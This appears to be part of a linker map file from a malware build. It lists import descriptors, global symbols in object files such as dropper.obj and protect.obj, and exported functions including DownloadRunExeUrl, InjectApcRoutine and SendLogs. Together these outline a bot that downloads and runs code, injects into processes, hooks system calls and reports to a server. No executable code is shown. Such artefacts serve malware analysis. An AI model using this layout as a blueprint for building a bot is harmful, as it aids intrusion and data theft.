 0002:00002a7c       __IMPORT_DESCRIPTOR_SHLWAPI 00408a7c     shlwapi:SHLWAPI.dll
 0002:00002a90       __IMPORT_DESCRIPTOR_SHELL32 00408a90     shell32:SHELL32.dll
 0002:00002aa4       __IMPORT_DESCRIPTOR_PSAPI  00408aa4     psapi:PSAPI.DLL
 0002:00002ab8       __IMPORT_DESCRIPTOR_WININET 00408ab8     wininet:WININET.dll
 0002:00002acc       __IMPORT_DESCRIPTOR_urlmon 00408acc     urlmon:urlmon.dll
 0002:00002ae0       __NULL_IMPORT_DESCRIPTOR   00408ae0     ntdll:ntdll.dll
 0003:00000000       ?cNewKeyboardLayout@@3PAEA 0040a000     common.obj
 0003:00000248       ?ExpFmt@@3PA_WA            0040a248     common.obj
 0003:0000046c       ?wszComment@@3PA_WA        0040a46c     common.obj
 0003:00000488       ?OldZwConnectPort@@3P6GJPAPAXPAU_UNICODE_STRING@@PAU_SECURITY_QUALITY_OF_SERVICE@@PAX3PAK34@ZA 0040a488     common.obj
 0003:00000490       ?hde32_table@@3PAEA        0040a490     common.obj
 0003:000006a0       ?ConfigFileName@Config@@3PADA 0040a6a0     config.obj
 0003:000007a4       ?CurrentImageBase@Drop@@3PAXA 0040a7a4     dropper.obj
 0003:000007a8       ?CurrentImageSize@Drop@@3KA 0040a7a8     dropper.obj
 0003:000007ac       ?bFirstImageLoad@Drop@@3EA 0040a7ac     dropper.obj
 0003:000007ad       ?g_UAC@Drop@@3EA           0040a7ad     dropper.obj
 0003:000007ae       ?g_bInject@Drop@@3EA       0040a7ae     dropper.obj
 0003:000007af       ?g_Admin@Drop@@3EA         0040a7af     dropper.obj
 0003:000007b0       ?CurrentModulePath@Drop@@3PADA 0040a7b0     dropper.obj
 0003:000008b4       ?BotID@Drop@@3PADA         0040a8b4     dropper.obj
 0003:000008f0       ?MachineGuid@Drop@@3PADA   0040a8f0     dropper.obj
 0003:000009f4       ?bWorkThread@Drop@@3EA     0040a9f4     dropper.obj
 0003:000009f8       ?g_chDllPath@Drop@@3PADA   0040a9f8     dropper.obj
 0003:00000afc       ?IntegrityLevel@Drop@@3KA  0040aafc     dropper.obj
 0003:00000b00       ?CurrentConfigPath@Drop@@3PADA 0040ab00     dropper.obj
 0003:00000c04       ?g_hProtectThread@@3PAXA   0040ac04     protect.obj
 0003:00001008       ?bKernelCode@@3HA          0040b008     common.obj
 0003:0000100c       ?OldZwConnectPortBytes@@3PAEA 0040b00c     common.obj
 0003:00001020       ?ConfigBuffer@Config@@3PAXA 0040b020     config.obj
 0003:00001024       ?ConfigSize@Config@@3KA    0040b024     config.obj
 0003:00001028       ?DctModules@Modules@@3PAU_DCT_MODULE@1@A 0040b028     modules.obj
 0003:00001f88       ?DctDelayedLoadModules@Modules@@3PAUDCT_DELAYEDLOAD@1@A 0040bf88     modules.obj
 0003:00002444       ?g_bStopProt@@3EA          0040c444     protect.obj
 0003:00002448       ?g_CurrentServer@@3PADA    0040c448     server.obj
 0003:00002550       ?g_chUserAgent@@3PADA      0040c550     utils.obj

 entry point at        0000:00000000

 Static symbols


 Exports

  ordinal    name

        1    ?DownloadRunExeId@@YGEKPADK@Z (unsigned char __stdcall DownloadRunExeId(unsigned long,char *,unsigned long))
               exported name: DownloadRunExeId
        2    ?DownloadRunExeUrl@@YGEKPAD0@Z (unsigned char __stdcall DownloadRunExeUrl(unsigned long,char *,char *))
               exported name: DownloadRunExeUrl
        3    ?DownloadRunModId@@YGEKPADK0K00K0@Z (unsigned char __stdcall DownloadRunModId(unsigned long,char *,unsigned long,char *,unsigned long,char *,char *,unsigned long,char *))
               exported name: DownloadRunModId
        4    ?DownloadUpdateMain@@YGEKPADKK@Z (unsigned char __stdcall DownloadUpdateMain(unsigned long,char *,unsigned long,unsigned long))
               exported name: DownloadUpdateMain
        5    ?InjectApcRoutine@@YGXPAX00@Z (void __stdcall InjectApcRoutine(void *,void *,void *))
               exported name: InjectApcRoutine
        6    ?InjectNormalRoutine@@YGXPAX@Z (void __stdcall InjectNormalRoutine(void *))
               exported name: InjectNormalRoutine
        7    ?SendLogs@@YGKKPAD@Z (unsigned long __stdcall SendLogs(unsigned long,char *))
               exported name: SendLogs
        8    ?WriteConfigString@@YGEKPAD000@Z (unsigned char __stdcall WriteConfigString(unsigned long,char *,char *,char *,char *))
               exported name: WriteConfigString
